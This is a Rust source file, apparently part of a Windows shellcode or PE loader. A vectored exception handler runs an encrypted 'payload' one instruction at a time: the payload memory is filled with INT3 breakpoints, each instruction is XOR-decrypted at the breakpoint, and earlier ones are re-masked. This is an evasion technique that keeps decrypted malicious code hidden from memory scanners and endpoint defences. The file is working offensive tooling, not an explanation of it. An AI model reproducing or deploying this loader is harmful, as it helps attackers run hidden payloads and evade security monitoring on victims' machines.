use windows::Win32::Foundation::{EXCEPTION_CONTINUE_EXECUTION, EXCEPTION_CONTINUE_SEARCH};
use windows::Win32::System::Diagnostics::Debug::{EXCEPTION_POINTERS, EXCEPTION_BREAKPOINT};
use windows::Win32::System::Threading::{GetCurrentProcess, TerminateProcess};
use std::sync::Mutex;
use indexmap::IndexMap;
use crate::utils::{log_program_fail};

// Constants
pub const ASM_INT3: u8 = 0xcc;
const MZ_HEADER: [u8; 2] = [b'M', b'Z'];

// Global state
static PAYLOAD_EXECUTED_ASM: Mutex<Option<*const IndexMap<u32, Vec<u8>>>> = Mutex::new(None);
static ENCRYPTION_KEY: Mutex<Option<*const Vec<u8>>> = Mutex::new(None);
static PAYLOAD_LOWER_BOUND: Mutex<Option<*const u8>> = Mutex::new(None);
static PAYLOAD_UPPER_BOUND: Mutex<Option<*const u8>> = Mutex::new(None);
static ASM_CLEAN_QUEUE: Mutex<Vec<(u32, u32)>> = Mutex::new(Vec::new());

/// Initialize global state for VEH
pub unsafe fn init_veh_globals(
    asm_map: *const IndexMap<u32, Vec<u8>>,
    key: *const Vec<u8>,
    lower_bound: *const u8,
    upper_bound: *const u8,
) {
    *PAYLOAD_EXECUTED_ASM.lock().unwrap() = Some(asm_map);
    *ENCRYPTION_KEY.lock().unwrap() = Some(key);
    *PAYLOAD_LOWER_BOUND.lock().unwrap() = Some(lower_bound);
    *PAYLOAD_UPPER_BOUND.lock().unwrap() = Some(upper_bound);
}

/// Check if an exception occurred within our payload
unsafe fn exception_happened_in_our_payload(exception_address: *const u8) -> bool {
    let lower = (*PAYLOAD_LOWER_BOUND.lock().unwrap()).unwrap();
    let upper = (*PAYLOAD_UPPER_BOUND.lock().unwrap()).unwrap();

    exception_address >= lower && exception_address <= upper
}

/// Calculate offset from payload base address
unsafe fn find_rip_offset_from_payload_base(rip: u64) -> u32 {
    let lower = (*PAYLOAD_LOWER_BOUND.lock().unwrap()).unwrap() as u64;
    (rip - lower) as u32
}

/// Vectored Exception Handler for EXCEPTION_BREAKPOINT
/// This handler executes the masked payload
pub unsafe extern "system" fn veh_payload(exception_info: *mut EXCEPTION_POINTERS) -> i32 {
    let exception_record = (*exception_info).ExceptionRecord;
    let context = (*exception_info).ContextRecord;

    let exception_address = (*exception_record).ExceptionAddress as *const u8;

    // Check if exception happened in our payload
    if !exception_happened_in_our_payload(exception_address) {
        return EXCEPTION_CONTINUE_SEARCH.0;
    }

    let exception_code = (*exception_record).ExceptionCode;

    if exception_code == EXCEPTION_BREAKPOINT {
        // Clean up previous instructions (re-mask with INT3)
        {
            let mut queue = ASM_CLEAN_QUEUE.lock().unwrap();
            if !queue.is_empty() {
                let lower = (*PAYLOAD_LOWER_BOUND.lock().unwrap()).unwrap() as *mut u8;

                for (asm_offset, asm_len) in queue.iter() {
                    let asm_addr = lower.add(*asm_offset as usize);
                    std::ptr::write_bytes(asm_addr, ASM_INT3, *asm_len as usize);
                }

                queue.clear();
            }
        }

        // Get current instruction offset
        let asm_offset = find_rip_offset_from_payload_base((*context).Rip);

        // Get the instruction from the map
        let map_ptr = (*PAYLOAD_EXECUTED_ASM.lock().unwrap()).unwrap();
        let payload_executed_asm = &*map_ptr;

        let Some(encrypted_asm) = payload_executed_asm.get(&asm_offset) else {
            log_program_fail("Failed to find offset in map... Exiting...");
            let _ = TerminateProcess(GetCurrentProcess(), 1);
            return EXCEPTION_CONTINUE_SEARCH.0;
        };

        // Decrypt and write the instruction
        let key_ptr = (*ENCRYPTION_KEY.lock().unwrap()).unwrap();
        let encryption_key = &*key_ptr;

        let asm_addr = (*context).Rip as *mut u8;
        let asm_len = encrypted_asm.len();

        for i in 0..asm_len {
            if i < encryption_key.len() {
                let decrypted_byte = encrypted_asm[i] ^ encryption_key[i];
                *asm_addr.add(i) = decrypted_byte;
            }
        }

        // Check if this is the MZ header (don't re-mask it)
        let is_mz_header = if asm_len == 2 {
            let byte1 = *asm_addr;
            let byte2 = *asm_addr.add(1);
            byte1 == MZ_HEADER[0] && byte2 == MZ_HEADER[1]
        } else {
            false
        };

        // Add to clean queue (unless it's MZ header)
        if !is_mz_header {
            let mut queue = ASM_CLEAN_QUEUE.lock().unwrap();
            queue.push((asm_offset, asm_len as u32));
        }

        return EXCEPTION_CONTINUE_EXECUTION.0;
    }

    EXCEPTION_CONTINUE_SEARCH.0
}
